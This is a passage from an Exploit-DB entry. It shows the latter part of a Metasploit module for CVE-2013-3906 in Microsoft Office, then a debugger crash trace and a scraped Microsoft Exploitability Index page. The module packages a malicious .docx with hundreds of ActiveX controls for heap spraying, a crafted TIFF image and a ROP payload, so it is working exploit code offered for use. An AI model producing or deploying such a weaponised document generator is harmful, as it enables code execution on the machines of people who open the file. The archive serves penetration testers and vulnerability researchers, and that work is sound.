        :ContentType => "application/vnd.ms-office.activeX"
      },
      {
        :Extension  => "xlsx",
        :ContentType => "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
      }
    ]

    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Types({'xmlns'=>"http://schemas.openxmlformats.org/package/2006/content-types"}) do
      # Default extensions
      contenttypes.each do |contenttype|
        xml.Default(contenttype)
      end

      # Additional overrides
      overrides.each do |override|
        override_attrs = {
          :PartName    => override[:PartName] || override[:fname],
          :ContentType => override[:ContentType]
        }
        xml.Override(override_attrs)
      end
    end
    end

    builder.to_xml(:indent => 0)
  end

  #
  # Pre-define some items that will be used in .rels
  #
  def init_doc_props(last_rid)
    items = []
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/extended-properties",
      :fname        => "/docProps/app.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.extended-properties+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties",
      :fname        => "/docProps/core.xml",
      :content_type => "application/vnd.openxmlformats-package.core-properties+xml"
    }

    return last_rid, items
  end

  #
  # Pre-define some items that will be used in document.xml.rels
  #
  def init_doc_xml_rels_items(last_rid)
    items = []
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/styles",
      :fname        => "/word/styles.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/settings",
      :fname        => "/word/settings.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/webSettings",
      :fname        => "/word/webSettings.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/fontTable",
      :fname        => "/word/fontTable.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/theme",
      :fname        => "/word/theme/theme1.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.theme+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart1.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart2.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart3.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart4.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart5.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }

    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart6.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }

    return last_rid, items
  end

  #
  # Manually create everything manually in the ActiveX directory
  #
  def init_activex_files(last_rid)
    activex = []

    0x250.times do |i|
      id = (last_rid += 1)

      bin  = {
        :fname => "/word/activeX/activeX#{id.to_s}.bin",
        :bin => make_activex_bin
      }

      xml  = {
        :fname => "/word/activeX/activeX#{id.to_s}.xml",
        :xml => make_activex_xml(id)
      }

      rels = {
        :fname => "/word/activeX/_rels/activeX#{id.to_s}.xml.rels",
        :rels => make_activex_xml_reals(id, "activeX#{id.to_s}.bin")
      }

      ct   = "application/vnd.ms-office.activeX+xml"
      type = "#{@schema}/control"

      activex << {
        :id           => id,
        :bin          => bin,
        :xml          => xml,
        :rels         => rels,
        :content_type => ct,
        :type         => type
      }
    end

    return last_rid, activex
  end

  #
  # Create a [Content_Types.xml], each node contains these attributes:
  # :PartName     The path to an ActiveX XML file
  # :ContentType  The contenttype of the XML file
  #
  def init_contenttype_xml_file(*items)
    overrides = []
    items.each do |item|
      item.each do |obj|
        overrides << {:PartName => obj[:fname] || obj[:xml][:fname], :ContentType => obj[:content_type]}
      end
    end

    {:fname => "[Content_Types].xml", :data => make_contenttype_xml(overrides)}
  end

  #
  # Creates the tiff file
  #
  def init_tiff_file(last_rid)
    id = last_rid + 1
    tiff_data = {
      :id   => id,
      :fname => "/word/media/image1.jpeg",
      :data  => make_tiff,
      :type  => "#{@schema}/image"
    }

    return id, tiff_data
  end

  #
  # Create the document.xml.rels file
  #
  def init_doc_xml_reals_file(pre_defs, activex, tiff)
    reals = []
    pre_defs.each do |obj|
      reals << {:id => obj[:id], :type => obj[:type], :target => obj[:fname].gsub(/^\/word\//, '')}
    end

    activex.each do |obj|
      reals << {:id => obj[:id], :type => obj[:type], :target => obj[:xml][:fname].gsub(/^\/word\//, '')}
    end

    reals << {:id => tiff[:id], :type => tiff[:type], :target => tiff[:fname].gsub(/^\/word\//, '')}

    {:fname => "/word/_rels/document.xml.rels", :data => make_doc_xml_reals(reals)}
  end

  #
  # Loads a fiile
  #
  def read_file(fname)
    buf = ''
    ::File.open(fname, "rb") do |f|
      buf << f.read
    end

    buf
  end

  #
  # Packages everything to docx
  #
  def make_docx(path)
    print_status("Initializing files...")
    last_rid = 0
    last_rid, doc_xml_rels_items = init_doc_xml_rels_items(last_rid)
    last_rid, activex            = init_activex_files(last_rid)
    last_rid, doc_props          = init_doc_props(last_rid)
    last_rid, tiff_file          = init_tiff_file(last_rid)
    doc_xml                      = init_doc_xml(last_rid, doc_xml_rels_items, activex, tiff_file)
    ct_xml_file                  = init_contenttype_xml_file(activex, doc_xml_rels_items, doc_props, [doc_xml])
    doc_xml_reals_file           = init_doc_xml_reals_file(doc_xml_rels_items, activex, tiff_file)
    rels_xml                     = init_rels(doc_xml, doc_props)

    zip = Rex::Zip::Archive.new
    Dir["#{path}/**/**"].each do |file|
      p = file.sub(path+'/','')

      if File.directory?(file)
        print_status("Packing directory: #{p}")
        zip.add_file(p)
      else
        # Avoid packing image1.jpeg because we'll load it separately
        if file !~ /media\/image1\.jpeg/
          print_status("Packing file: #{p}")
          zip.add_file(p, read_file(file))
        end
      end
    end

    print_status("Packing ActiveX controls...")
    activex.each do |ax|
      ax_bin  = ax[:bin]
      ax_xml  = ax[:xml]
      ax_rels = ax[:rels]

      vprint_status("Packing file: #{ax_bin[:fname]}")
      zip.add_file(ax_bin[:fname], ax_bin[:bin])

      vprint_status("Packing file: #{ax_xml[:fname]}")
      zip.add_file(ax_xml[:fname], ax_xml[:xml])

      vprint_status("Packing file: #{ax_rels[:fname]}")
      zip.add_file(ax_rels[:fname], ax_rels[:rels])
    end

    print_status("Packing file: #{ct_xml_file[:fname]}")
    zip.add_file(ct_xml_file[:fname], ct_xml_file[:data])

    print_status("Packing file: #{tiff_file[:fname]}")
    zip.add_file(tiff_file[:fname], tiff_file[:data])

    print_status("Packing file: #{doc_xml[:fname]}")
    zip.add_file(doc_xml[:fname], doc_xml[:xml])

    print_status("Packing file: #{rels_xml[:fname]}")
    zip.add_file(rels_xml[:fname], rels_xml[:data])

    print_status("Packing file: #{doc_xml_reals_file[:fname]}")
    zip.add_file(doc_xml_reals_file[:fname], doc_xml_reals_file[:data])

    zip.pack
  end

  def exploit
    @rop_payload = get_rop_payload
    @schema = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    path = File.join(Msf::Config.data_directory, "exploits", "CVE-2013-3906")
    docx = make_docx(path)
    file_create(docx)
  end

end

=begin

0:000> r
eax=414242f4 ebx=00000000 ecx=22a962a0 edx=44191398 esi=22c4d338 edi=1cfe5dc0
eip=44023a2a esp=0011fd8c ebp=0011fd98 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
OGL!GdipCreatePath+0x58:
44023a2a ff5050          call    dword ptr [eax+50h]  ds:0023:41424344=????????
0:000> k
ChildEBP RetAddr
WARNING: Stack unwind information not available. Following frames may be wrong.
0011fd98 437a9681 OGL!GdipCreatePath+0x58
0011fdc8 437b11b0 gfx+0x9681
0011fdf0 422b56e5 gfx+0x111b0
0011fe18 422a99f7 oart!Ordinal3584+0x86
0011fed8 422a9921 oart!Ordinal7649+0x2b2
0011fef0 422a8676 oart!Ordinal7649+0x1dc
001200bc 422a85a8 oart!Ordinal4145+0x199
001200fc 424898c6 oart!Ordinal4145+0xcb
001201bc 42489b56 oart!Ordinal3146+0xb15
001202cc 422a37df oart!Ordinal3146+0xda5
00120330 422a2a73 oart!Ordinal2862+0x14e
00120360 317821a9 oart!Ordinal2458+0x5e
001203bc 31782110 wwlib!GetAllocCounters+0x9bd51
001204a4 3177d1f2 wwlib!GetAllocCounters+0x9bcb8
001207ec 3177caef wwlib!GetAllocCounters+0x96d9a
0012088c 3177c7a0 wwlib!GetAllocCounters+0x96697
001209b0 3175ab83 wwlib!GetAllocCounters+0x96348
001209d4 317569e0 wwlib!GetAllocCounters+0x7472b
00120ad4 317540f5 wwlib!GetAllocCounters+0x70588
00120afc 3175400b wwlib!GetAllocCounters+0x6dc9d

  To-do:
  Turn the docx packaging into a mixin. Good luck with that.

=end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](http://technet.microsoft.com/en-us/security/advisory/2896666)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from technet.microsoft.com_4bf006a4_20250126_083718.html ===


This is the Trace Id: 7e7f74b622630a82d0614e6b30fd6c14

Skip to main content

[![](https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31)
Microsoft](https://www.microsoft.com)

MSRC

[MSRC](https://msrc.microsoft.com/)

MSRC

* [Home](https://msrc.microsoft.com/)
* Report an issue
  + [Report Security Vulnerability](https://msrc.microsoft.com/report/vulnerability/new)
  + [Report Abuse](https://msrc.microsoft.com/report/abuse)
  + [Report Infringement](https://msrc.microsoft.com/report/infringement)
  + [Submission FAQs](https://microsoft.com/msrc/faqs-report-an-issue)
* Customer guidance
  + [Security Update Guide](https://msrc.microsoft.com/update-guide)
  + [Exploitability index](https://microsoft.com/msrc/exploitability-index)
  + [Developer API documentation](https://aka.ms/msrc-api-docs-cvrf)
  + [Frequently Asked Questions](https://www.microsoft.com/msrc/faqs-security-update-guide)
  + [Technical Security Notifications](https://www.microsoft.com/en-us/msrc/technical-security-notifications)
* Engage
  + [Microsoft Bug Bounty Programs](https://microsoft.com/msrc/bounty)
  + [Microsoft Active Protections Program](https://microsoft.com/msrc/mapp)
  + [BlueHat Security Conference](https://www.microsoft.com/bluehat/)
  + [Researcher Recognition Program](https://www.microsoft.com/en-us/msrc/researcher-recognition-program)
  + [Windows Security Servicing Criteria](https://microsoft.com/msrc/windows-security-servicing-criteria)
  + [Researcher Resource Center](https://www.microsoft.com/en-us/msrc/msrc-researcher-resource-center)
* Who we are
  + [Mission](https://microsoft.com/msrc/mission)
  + [Cyber Defense Operations Center](https://microsoft.com/msrc/cdoc)
  + [Coordinated Vulnerability Disclosure](https://microsoft.com/msrc/cvd)
  + [Social](https://microsoft.com/msrc/social)
* Blogs
  + [Microsoft Security Response Center](https://aka.ms/blog-msrc)
  + [Security Research & Defense](https://aka.ms/blog-srd)
  + [BlueHat Conference Blog](https://aka.ms/blog-bluehat)
* Acknowledgments
  + [Security Researcher Acknowledgments](https://msrc.microsoft.com/update-guide/acknowledgment)
  + [Online Services Researcher Acknowledgments](https://msrc.microsoft.com/update-guide/acknowledgement/online)
  + [Security Researcher Leaderboard](https://msrc.microsoft.com/leaderboard)
* More

* All Microsoft
  + ## Global

    - [Microsoft 365](https://www.microsoft.com/microsoft-365)
    - [Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
    - [Copilot](https://copilot.microsoft.com/)
    - [Windows](https://www.microsoft.com/en-us/windows/)
    - [Surface](https://www.microsoft.com/surface)
    - [Xbox](https://www.xbox.com/)
    - [Deals](https://www.microsoft.com/en-us/store/b/sale?icid=gm_nav_L0_salepage)
    - [Small Business](https://www.microsoft.com/en-us/store/b/business)
    - [Support](https://support.microsoft.com/en-us)
  + Software
    Software
    - [Windows Apps](https://www.microsoft.com/en-us/store/apps/windows?icid=CNavAppsWindowsApps)
    - [AI](https://www.microsoft.com/en-us/ai)
    - [Outlook](https://www.microsoft.com/en-us/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook)
    - [OneDrive](https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage)
    - [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
    - [OneNote](https://www.microsoft.com/en-us/microsoft-365/onenote/digital-note-taking-app)
    - [Microsoft Edge](https://www.microsoft.com/edge)
    - [Skype](https://www.skype.com/en/)
  + PCs & Devices
    PCs & Devices
    - [Computers](https://www.microsoft.com/en-us/store/b/pc?icid=CNavDevicesPC)
    - [Shop Xbox](https://www.microsoft.com/en-us/store/b/xbox?icid=CNavDevicesXbox)
    - [Accessories](https://www.microsoft.com/en-us/store/b/accessories?icid=CNavDevicesAccessories)
    - [VR & mixed reality](https://www.microsoft.com/en-us/store/b/virtualreality?icid=CNavVirtualReality)
    - [Certified Refurbished](https://www.microsoft.com/en-us/store/b/certified-refurbished-products)
    - [Trade-in for cash](https://www.microsoft.com/en-us/store/b/microsoft-trade-in)
  + Entertainment
    Entertainment
    - [Xbox Game Pass Ultimate](https://www.xbox.com/en-us/games/store/xbox-game-pass-ultimate/cfq7ttc0khs0?icid=CNavAllXboxGamePassUltimate)
    - [PC Game Pass](https://www.xbox.com/en-us/games/store/pc-game-pass/cfq7ttc0kgq8?icid=CNavAllPCGamePass)
    - [Xbox games](https://www.microsoft.com/en-us/store/b/xboxgames?icid=CNavGamesXboxGames)
    - [PC and Windows games](https://www.microsoft.com/en-us/store/games/windows?icid=CNavGamesWindowsGames)
    - [Movies & TV](https://www.microsoft.com/en-us/store/movies-and-tv?icid=TopNavMoviesTv)
  + Business
    Business
    - [Microsoft Cloud](https://www.microsoft.com/en-us/microsoft-cloud)
    - [Microsoft Security](https://www.microsoft.com/en-us/security)
    - [Dynamics 365](https://www.microsoft.com/en-us/dynamics-365)
    - [Microsoft 365 for business](https://www.microsoft.com/en-us/microsoft-365/business)
    - [Microsoft Power Platform](https://www.microsoft.com/en-us/power-platform)
    - [Windows 365](https://www.microsoft.com/en-us/windows-365)
    - [Microsoft Industry](https://www.microsoft.com/en-us/industry)
    - [Small Business](https://www.microsoft.com/en-us/store/b/business?icid=CNavBusinessStore)
  + Developer & IT
    Developer & IT
    - [Azure](https://azure.microsoft.com/en-us/)
    - [Microsoft Developer](https://developer.microsoft.com/en-us/)
    - [Documentation](https://learn.microsoft.com/docs/)
    - [Microsoft Learn](https://learn.microsoft.com/)
    - [Microsoft Tech Community](https://techcommunity.microsoft.com/)
    - [Azure Marketplace](https://azuremarketplace.microsoft.com/en-us/)
    - [AppSource](https://appsource.microsoft.com/en-us/)
    - [Visual Studio](https://visualstudio.microsoft.com/)
  + Other
    Other
    - [Microsoft Rewards](https://www.microsoft.com/rewards)
    - [Free downloads & security](https://www.microsoft.com/en-us/download)
    - [Education](https://www.microsoft.com/en-us/education)
    - [Gift cards](https://www.microsoft.com/en-us/store/b/gift-cards)
    - [Licensing](https://www.microsoft.com/licensing/)
    - [Unlocked stories](https://unlocked.microsoft.com/)
  + [View Sitemap](https://www.microsoft.com/en-us/sitemap)

Search
Search Microsoft.com

* No results

Cancel

# Microsoft Exploitability Index

The Microsoft Exploitability Index helps customers prioritize security update deployment by providing information on the likelihood that a vulnerability addressed in a Microsoft security update will be exploited.

## The Microsoft Exploitability Index

The Exploitability Index may help customers evaluate risk for a vulnerability. Microsoft evaluates the potential exploitability of each vulnerability associated with a Microsoft security update and then publishes the exploitability information as part of the monthly Microsoft security update details. If after publishing the details Microsoft determines that the Exploitability Index Assessment warrants a change, it will change the assessment and notify customers through technical security notifications. The company will not update the assessment when exploit code is posted that matches the existing exploitability information.

The Exploitability Index uses one of four values to communicate to customers the likelihood of a vulnerability being exploited, based on the vulnerabilities addressed by the Microsoft security update.

| Exploitability index assessment | Short definition |
| --- | --- |
| 0 | Exploitation detected |
| 1 | Exploitation more likely \* |
| 2 | Exploitation less likely \*\* |
| 3 | Exploitation unlikely \*\*\* |

### 0 – Exploitation Detected

Microsoft is aware of an instance of this vulnerability being exploited. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with the highest priority.

### 1 – Exploitation More Likely

Microsoft analysis has shown that exploit code could be created in such a way that an attacker could consistently exploit this vulnerability. Moreover, Microsoft is aware of past instances of this type of vulnerability being exploited. This would make it an attractive target for attackers, and therefore more likely that exploits could be created. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with a higher priority.

### 2 – Exploitation Less Likely

Microsoft analysis has shown that while exploit code could be created, an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product. Moreover, Microsoft has not recently observed a trend of this type of vulnerability being actively exploited in the wild. This makes it a less attractive target for attackers. That said, customers who reviewed the security update and determined its applicability within their environment should still treat this as a material update. If they are prioritizing against other highly exploitable vulnerabilities, they could rank this lower in their deployment priority.

### 3 – Exploitation Unlikely

Microsoft analysis shows that successfully functioning exploit code is unlikely to be utilized in real attacks. This means that while it might be possible for exploit code to be released that could trigger the vulnerability and cause abnormal behavior, the full impact of exploitation will be more limited. Moreover, Microsoft has not observed instances of this type of vulnerability being actively exploited in the past. Thus, the actual risk of being exploited from this vulnerability is significantly lower. Therefore, customers who have reviewed the security update to determine its applicability within their environment could prioritize this update below other vulnerabilities within a release.

In those scenarios where multiple product series are affected, for instance a vulnerability that affects both Windows and Office, the rating reflects the highest risk level across both products. Likewise, the rating reflects the highest risk present across all versions of the product.  In this case, if the Exploitability Assessment on the latest version of Office is "1," and on the latest version of Windows is "2," the rating will reflect "1."  If the XI rating for Windows 10 version 2004 is “2” and the rating for Windows 7 is “1”, the rating will reflect “1”.

## Important Terms and Definitions

**Exploit Code** – A software program or sample code that, when executed against a vulnerable system, uses the vulnerability to spoof attacker identity, tamper with user or system information, repudiate attacker action, disclose user or system information on the server side, deny service to valid users, or elevate privileges for the attacker. For example, if a vulnerability had a security impact of remote code execution, Exploit Code could cause remote code execution to occur when run against a target system.

**Trigger a Vulnerability** – The ability to reach the vulnerable code, but not always achieving the maximum impact. For example, it may be easy to trigger a remote code execution vulnerability, but the resulting effect may only be a denial of service.

Expand all
 |
Collapse all

* ### What is the Microsoft Exploitability Index?

  The Microsoft Exploitability Index provides additional information to help customers prioritize their deployment of the monthly security updates. Microsoft designed this index to provide customers guidance concerning the likelihood of exploitation, based on each vulnerability addressed by Microsoft security updates.
* ### Why did Microsoft create the Exploitability Index?

  Customers asked for more information to help them prioritize their deployment of Microsoft security updates each month, specifically requesting details about the likelihood of exploitation for the vulnerabilities addressed in security updates. The Exploitability Index provides guidance about the actual risk of exploitation of a vulnerability at the time of the security update’s release.
* ### How are vulnerabilities rated?

  Microsoft Exploitability Index focuses on two aspects of a vulnerability to build its ratings:
  1. Current exploitation trends, based on telemetry data and awareness of exploitation of a particular type of vulnerability in a particular product,
  2. The cost and reliability of building a working exploit for the vulnerability, based on a technical analysis of the vulnerability.
* ### Is this a truly reliable rating system?

  While reliably predicting activity within the security ecosystem is always difficult, there are three reasons why this system should be useful. First, over the last few years we have realized that many security researchers analyze the updates associated with Microsoft's security updates the day they are released to create and evaluate protections. In doing so, many of these researchers also create exploit code to test them. The methodology used to develop this exploit code is like the one Microsoft uses to determine the likelihood of exploit code release. Microsoft analyzes the updates themselves, the nature of the vulnerability, and the conditions that must be met for an exploit to execute successfully. Second, not all vulnerabilities resolved by our security updates are exploited. A vulnerability may well be technically exploitable with a high degree of reliability, but it may never be exploited. We continuously monitor and track exploitation activity to keep up to date with current trends. This in turn informs our opinion of what constitutes a more attractive vulnerability over similar vulnerabilities, and enables us to more accurately communicate an actual risk, rather than a potential one from the vulnerabilities we patch.
  Finally, we are also partnering with protection providers through the Microsoft Active Protections Program (MAPP), working with them to help validate our predictions each month – thereby using a community approach to ensure better accuracy through information sharing.
* ### How is the Exploitability Index different from the Security Update Severity Rating system?

  The Security Update Severity Rating System assumes that exploitation will be successful. For some vulnerabilities where exploitability is high, this assumption is very likely to be true for a broad set of attackers. For other vulnerabilities where exploitability is low, this assumption may only be true when a dedicated attacker puts a lot of resources into ensuring their attack is successful. Regardless of the Severity or Exploitability Index rating, Microsoft always recommends that customers deploy all applicable and available updates; however, this rating information can assist sophisticated customers in prioritizing their approach to each month's release.
* ### How are Denial of Service, Tampering, Information Disclosure, or Spoofing issues rated?

  The Exploitability Index does not differentiate between vulnerability types. It focuses on the likelihood of exploitation of each vulnerability within the range of their full impact potential. Thus, any vulnerability, whether it is Remote Code Execution, Tampering or other, could be rated any of the Exploitability Index ratings.
* ### What happens when newly emerging information requires an update to the Exploitability Index rating?

